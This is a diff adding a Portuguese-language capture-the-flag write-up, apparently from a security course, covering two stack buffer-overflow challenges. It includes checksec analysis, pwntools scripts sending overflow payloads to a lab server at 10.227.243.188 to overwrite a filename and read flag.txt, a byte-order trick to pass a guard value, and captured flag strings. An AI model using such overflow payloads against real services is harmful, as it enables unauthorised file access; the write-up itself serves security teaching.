@@ -123,3 +123,107 @@ e executar o programa, `stack-L1`, para por a prova o exploit:
 Como se pode confirmar, foi assim obtida a *shell* com permissõe de *root*.
 
 ## CTF
+
+### Desafio 1
+
+Começamos por executar o seguinte comando:
+```sh
+checksec program
+```
+que retornou a seguinte informação:  
+![/imgs5/ctf/checksec_program.png](/imgs5/ctf/checksec_program.png)
+
+Daqui apercebemo-nos dos seguintes pontos:  
+- Sem cannary a proteger a *stack*
+- A stack tem permissões de execução
+- As posições do binário não estão randomizadas
+- Existem regiões de memória com permissões de leitura, escrita e execução simultaneamente
+
+Após esta análise inicial, analisámos o *source code* de forma a responder às questões
+levantadas no enunciado:
+
+1. Existe algum ficheiro que é aberto e lido pelo programa?
+    - Sim, o ficheiro cujo nome está guardado em `char meme_file[8]`.
+
+2. Existe alguma forma de controlar o ficheiro que é aberto?
+    - Sim, se for alterado o conteúdo de `char meme_file[8]`.
+
+3. Existe algum buffer-overflow? Se sim, o que é que podes fazer?
+    - Sim, é feito *scanf()* de um máximo de 28 caracteres para `char buffer[20]`
+    que se encontra junto de `char meme_file[8]`.
+
+Assim sendo, tornou-se óbvio que bastaria forncecer como input 20 caracteres seguidos
+pelo nome do ficheiro que contém a *flag*: `flag.txt`
+
+Decidimos que o input fornecido seria:
+```
+11111111111111111111flag.txt
+```
+
+Utilizámos o *script* em python fornecido:
+```py
+#!/usr/bin/python3
+from pwn import *
+
+DEBUG = False
+
+if DEBUG:
+    r = process('./program')
+else:
+    r = remote('10.227.243.188', 4003)
+
+r.recvuntil(b":")
+r.sendline(b"11111111111111111111flag.txt")
+r.interactive()
+```
+
+E realizámos o ataque:  
+![/imgs5/ctf/flag1.png](/imgs5/ctf/flag1.png)
+
+(Nota: a *flag* submetida foi outra, dado que quando fizemos o *ctf* pela primeira vez
+não tiramos *print*, guardando apenas a *flag*: `flag{28c75ec90c0b6c3022b7e315c2ff7645}`)
+
+
+### Desafio 2
+
+Começamos por correr de novo `checksec` obtendo os mesmos resultados que no Desafio 1.
+
+Após isto, analisámos o *source code* de modo a responder às questões levantadas no enunciado:
+
+1. Que alterações foram feitas?  
+    - Foi adicionado o *buffer* `char val[4]` entre `char meme_file[8]` e `char buffer[20]`.
+    - É verficado se o conteúdo de `char val[4]` é igual a `0xfefc2122` para tentar abrir o ficheiro.
+2. Mitigam na totalidade o problema?
+    - Não.
+3. É possivel ultrapassar a mitigação usando uma técnica similar à que foi utilizada anteriormente?
+    - Sim.
+
+De modo a contornar a verficação extra basta enviar `0xfefc2122` entre os 20 caracteres iniciais e o `flag.txt`:
+```
+11111111111111111111\x22\x21\xfc\xfeflag.txt
+```
+
+De notar que a ordem dos bytes de `0xfefc2122` foi trocada devido ao sistema ser *little-endian*.
+
+Mais uma vez utilizámos o script em python fornecido:
+```py
+#!/usr/bin/python3
+from pwn import *
+
+DEBUG = False
+
+if DEBUG:
+    r = process('./program')
+else:
+    r = remote('10.227.243.188', 4000)
+
+r.recvuntil(b":")
+r.sendline(b"11111111111111111111\x22\x21\xfc\xfeflag.txt")
+r.interactive()
+```
+
+E realizámos o ataque:
+![/imgs5/ctf/flag2.png](/imgs5/ctf/flag2.png)
+
+(Nota (de novo): a *flag* submetida foi outra, dado que quando fizemos o *ctf* pela primeira vez
+não tiramos *print*, guardando apenas a *flag*: `flag{03e288622daca70b7ad96e0d0b808279}`)
